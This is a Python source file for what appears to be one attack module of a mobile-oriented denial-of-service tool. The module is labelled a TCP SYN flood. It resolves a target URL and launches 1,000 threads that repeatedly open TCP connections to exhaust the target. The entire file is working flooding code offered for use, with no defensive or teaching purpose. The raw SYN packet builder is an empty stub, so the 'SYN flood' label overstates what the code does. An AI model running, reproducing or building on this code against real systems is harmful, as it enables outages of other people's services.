"""
TCP SYN Flood Attack Handler
"""

import socket
import random
import threading
import time
import struct

class TCPSynFlood:
    def __init__(self):
        self.name = "TCP SYN FLOOD"
        self.running = False
        self.stats = {
            'packets': 0,
            'errors': 0,
            'threads': 0
        }
        self.target_ip = None
        self.target_port = None
        self.threads = []
    
    def resolve_target(self, target):
        """Extract IP and port from URL"""
        from urllib.parse import urlparse
        parsed = urlparse(target)
        hostname = parsed.netloc.split(':')[0]
        
        try:
            self.target_ip = socket.gethostbyname(hostname)
        except:
            self.target_ip = hostname
        
        if parsed.scheme == 'https':
            self.target_port = 443
        else:
            self.target_port = 80
        
        if ':' in parsed.netloc:
            try:
                self.target_port = int(parsed.netloc.split(':')[1])
            except:
                pass
    
    def create_syn_packet(self, source_ip, source_port, dest_ip, dest_port):
        """Create SYN packet (simplified)"""
        # In real implementation, this would use raw sockets
        # For Termux compatibility, we use TCP connect scan
        return None
    
    def flood_worker(self, worker_id, threads_per_sec):
        """TCP SYN flood worker"""
        while self.running:
            try:
                # Create TCP socket
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(1)
                
                # Try to connect (this creates SYN packet)
                result = sock.connect_ex((self.target_ip, self.target_port))
                
                self.stats['packets'] += 1
                sock.close()
                
                # Rate limiting
                if threads_per_sec > 0:
                    time.sleep(1.0 / threads_per_sec)
                
            except Exception:
                self.stats['errors'] += 1
    
    def start(self, target, threads_config, main_tool):
        """Start TCP SYN flood attack"""
        self.running = True
        self.target = target
        self.resolve_target(target)
        
        print(f"\n{self.name} attack started on {self.target_ip}:{self.target_port}")
        
        threads_per_sec = threads_config
        worker_count = 1000
        
        if threads_per_sec == 0:
            thread_delay = 0
        else:
            thread_delay = 1.0 / threads_per_sec
        
        # Start workers
        for i in range(worker_count):
            if not self.running:
                break
            
            thread = threading.Thread(
                target=self.flood_worker,
                args=(i, threads_per_sec)
            )
            thread.daemon = True
            thread.start()
            self.threads.append(thread)
            self.stats['threads'] = len(self.threads)
            
            if thread_delay > 0:
                time.sleep(thread_delay)
        
        while self.running and main_tool.running:
            time.sleep(1)
    
    def stop(self):
        """Stop TCP SYN flood"""
        self.running = False
    
    def get_stats(self):
        """Get current statistics"""
        return self.stats
